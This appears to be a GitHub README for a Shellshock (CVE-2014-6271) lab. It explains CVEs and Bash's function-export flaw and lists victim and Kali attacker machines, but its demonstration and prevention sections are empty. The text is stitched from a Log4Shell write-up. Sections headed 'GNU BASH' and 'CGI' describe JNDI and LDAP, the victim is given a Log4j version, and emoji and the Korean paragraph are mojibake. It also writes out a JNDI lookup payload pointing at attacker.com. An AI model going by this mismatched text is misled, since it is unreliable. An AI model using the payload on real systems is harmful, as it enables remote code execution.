# ðŸŽ¥ Shell Shock Vulnerability CVE-2014-6271

## ðŸ”Ž What is CVE ?
ðŸ’¬
![image](https://user-images.githubusercontent.com/118449010/206201960-90658f31-3830-43e9-9488-7a41e0aaaba8.png)
> CVE is short for `Common Vulnerabilities and Exposures.` It means publicly known information-security vulnerabilities in publicly released software packages. The informaion is then assigend a CVE ID by a CVE Numbering Authority, CNA. CVEs help IT organizations to more systematically identify security flaws and compensate for vulnerabilities. And it consists of a structure in the order of prefix, year, and numbering.
> #### <div align=center> CVE(Prefix) - 1996(Year) - 0224(Numbering) </div>
> 



## ðŸ”Ž What is Shell Shock ?
ðŸ’¬
> The Shellshock vulnerability affects Unix-based OS System Bash, a program that various Unix-based OS systems use to execute command lines and command scripts. It is often installed as the system's default command-line interface. Shellshock is an arbitrary code execution(In computer security, arbitrary code execution (ACE) is an attacker's ability to run any commands or code of the attacker's choice on a target machine or in a target process.) vulnerability that offers a way for users of a system to execute commands that should be unavailable to them. Usually, Attackers steal root accounts and execute malicious code through these vulnerabilities. This happens through Bash's "function export" feature, whereby one Bash process can share command scripts with other Bash processes that it executes. This feature is implemented by encoding the scripts in a table that is shared between the processes, known as the environment variable list. Each new Bash process scans this table for encoded scripts, assembles each one into a command that defines that script in the new process, and executes that command. The new process assumes that the scripts found in the list come from another Bash process, but it cannot verify this, nor can it verify that the command that it has built is a properly formed script definition. Therefore, an attacker can execute arbitrary commands on the system or exploit other bugs that may exist in Bash's command interpreter, if the attacker has a way to manipulate the environment variable list and then cause Bash to run. 
>
> **ì‰˜ì‡¼í¬ ì·¨ì•½ì ì€ ë‹¤ì–‘í•œ ìœ ë‹‰ìŠ¤ ê¸°ë°˜ ìš´ì˜ì²´ì œì—ì„œ ëª…ë ¹ì¤„ê³¼ ëª…ë ¹ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ëŠ” ë°ì— ì‚¬ìš©ë˜ëŠ” Bashì— ì˜í–¥**ì„ ì¤ë‹ˆë‹¤. BashëŠ” ì‹œìŠ¤í…œ ê¸°ë³¸ ëª…ë ¹ì¤„ ì¸í„°íŽ˜ì´ìŠ¤ë¡œì„œ ì„¤ì¹˜ë©ë‹ˆë‹¤. ì‰˜ì‡¼í¬ëŠ” ì‹œìŠ¤í…œ ì‚¬ìš©ìžê°€ ì‚¬ìš©í•  ìˆ˜ ì—†ëŠ” ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ ì œê³µí•˜ëŠ” ìž„ì˜ ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ìž…ë‹ˆë‹¤. (ìž„ì˜ ì½”ë“œ ì‹¤í–‰ì€ ì»´í“¨í„° ë³´ì•ˆì—ì„œ ê³µê²©ìžê°€ ì„ íƒí•œ ì–´ë–¤ ëª…ë ¹ì´ë‚˜ ì½”ë“œë¥¼ íƒ€ê²Ÿ ì‹œìŠ¤í…œ ë˜ëŠ” íƒ€ê²Ÿ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìžˆëŠ” ëŠ¥ë ¥ì„ ë§í•©ë‹ˆë‹¤.) ì¼ë°˜ì ìœ¼ë¡œ, ê³µê²©ìžë“¤ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì´ìš©í•©ë‹ˆë‹¤. ê³µê²©ìžë“¤ì€ ì´ëŸ¬í•œ ì·¨ì•½ì ì„ ì´ìš©í•´ ë£¨íŠ¸ ê³„ì •ì„ íƒˆì·¨í•˜ê³  ì•…ì˜ì ì¸ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì¼ì´ ë°œìƒí•˜ëŠ” ì›ì¸ì€ Bashì˜ "í•¨ìˆ˜ ë‚´ë³´ë‚´ê¸°" ê¸°ëŠ¥ìž…ë‹ˆë‹¤. ì´ëŠ” í•œ í”„ë¡œì„¸ìŠ¤ê°€ ì‹¤í–‰í•˜ëŠ” ë‹¤ë¥¸ Bash í”„ë¡œì„¸ìŠ¤ì™€ ëª…ë ¹ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ê³µìœ í•  ìˆ˜ ìžˆê²Œ í•©ë‹ˆë‹¤. í•´ë‹¹ ê¸°ëŠ¥ì€ í™˜ê²½ ë³€ìˆ˜ ëª©ë¡ìœ¼ë¡œ ì•Œë ¤ì§„ í”„ë¡œì„¸ìŠ¤ ê°„ì— ê³µìœ ë˜ëŠ” í…Œì´ë¸”ì˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì¸ì½”ë”©í•˜ì—¬ êµ¬í˜„ë©ë‹ˆë‹¤. ê° New Bash í”„ë¡œì„¸ìŠ¤ëŠ” í•´ë‹¹ í…Œì´ë¸”ì—ì„œ ì¸ì½”ë”©ëœ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ê²€ìƒ‰í•˜ê³ , ìƒˆë¡œìš´ í”„ë¡œì„¸ìŠ¤ì—ì„œëŠ” ê° ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì •ì˜í•˜ëŠ” ëª…ë ¹ì–´ë¡œ êµ¬ì„±í•˜ê³ , í•´ë‹¹ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. ìƒˆ í”„ë¡œì„¸ìŠ¤ì—ì„œëŠ” ëª©ë¡ì—ì„œ ì°¾ì€ ìŠ¤í¬ë¦½íŠ¸ê°€ ë‹¤ë¥¸ Bash í”„ë¡œì„¸ìŠ¤ì—ì„œ ê°€ì ¸ì˜¨ ê²ƒìœ¼ë¡œ ì¶”ì •í•˜ì§€ë§Œ ì‹¤ì œë¡œëŠ” ì´ë¥¼ ìž…ì¦í•  ìˆ˜ ì—†ì„ ë¿ë§Œ ì•„ë‹ˆë¼, ë¹Œë“œí•œ ëª…ë ¹ì–´ê°€ ì œëŒ€ë¡œ êµ¬ì„±ëœ ìŠ¤í¬ë¦½íŠ¸ ì •ì˜ì¸ì§€ í™•ì¸í•  ìˆ˜ë„ ì—†ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë¯€ë¡œ, ê³µê²©ìžëŠ” í™˜ê²½ ë³‘ìˆ˜ ëª©ë¡ì„ ì¡°ìž‘í•´ì„œ Bashë¥¼ ì‹¤í–‰í•˜ê²Œ ëœë‹¤ë©´ ê³µê²©ìžëŠ” ì‹œìŠ¤í…œì—ì„œ ìž„ì˜ ëª…ë ¹(ACE)ì„ ì‹¤í–‰í•˜ê±°ë‚˜ Bashì˜ ëª…ë  ì¸í„°í”„ë¦¬í„°ì— ìžˆì„ ìˆ˜ ìžˆëŠ” ë˜ ë‹¤ë¥¸ ë²„ê·¸ë¥¼ ì´ìš©í•  ìˆ˜ ìžˆìŠµë‹ˆë‹¤.

> 


## :recycle: Log4Shell Attack Life-Cycle


## :closed_book: Attackable Versions
### CVE-2014-6271 `RCE: Remote Code Execution Vulnerability`


## ðŸ”Ž What is GNU BASH ?
ðŸ’¬
> JNDI is short for Java Naming and Directory Interface. It provides an API for applications to interact with remote objects registered with the RMI registry or directory services like LDAP. JNDI has a number of service provider interfaces (SPIs) that enable it to use a variety of directory service like RMI(Remote Method),CORBRA(Common Object Request Broket Architecture), LDAP(Lightweight Directory Access Protocol), and DNS(Domain Name Service). For example, if we access the URL `ldap://localhost:3389/o=test`, then we can find the 'test' object on the LDAP server. When we do this Jndi Lookup, This is because Java class files can be downloaded and executed without verifying the unsafe(hostile) server. Eventually, if the attacker finds out where it is logged, then just add a value like `${jndi:ldap://attacker.com/a}`. Vulnerabilities can be exploited. 
> 

## ðŸ”Ž What is CGI ?
ðŸ’¬
> LDAP is short for Lightweight Directory Access Protocol. LDAP is application protocol for accessing and modifying directory services. one of the disadvantages of RDBMS is Lack of Speed. LDAP is used to compensate for the problem often. also, LDAP is suitable for roles that not update frequently and require a lot of search requests. + It is mainly used for other services for authentication(and authorization).
> 

## :hammer: Tool
### Victim Information
<img src="https://img.shields.io/badge/Ubuntu-FFB71B?style=for-the-badge&logo=Ubuntu&logoColor=black"> <img src="https://img.shields.io/badge/Apache-D22128?style=for-the-badge&logo=Apache&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 

- **OS**: Ubuntu 18.04.6-live-server-amd64
- **IP**: 192.168.0.138
- **Log4j**: 2.14.1

### Attacker Information
<img src="https://img.shields.io/badge/Kali Linux-557C94?style=for-the-badge&logo=Kali Linux&logoColor=white"> <img src="https://img.shields.io/badge/VMware-607078?style=for-the-badge&logo=VMware&logoColor=white"> 
- **OS**: Kali Linux
- **IP**: 192.168.0.15
- **LDAP Port**: 1389
- **Web Port**: 8000
- **nc Port**: 9001


# ðŸŽ¥ Attack Demonstration
## ðŸ’» Ubuntu 18.04.6


## ðŸ’» Kali Linux

## :scroll: Result

## ðŸ”Ž Prevent-Solution

![header](https://capsule-render.vercel.app/api?type=waving&color=auto&height=300&section=header&text=KWAK%20JOONHWAN&fontSize=90)
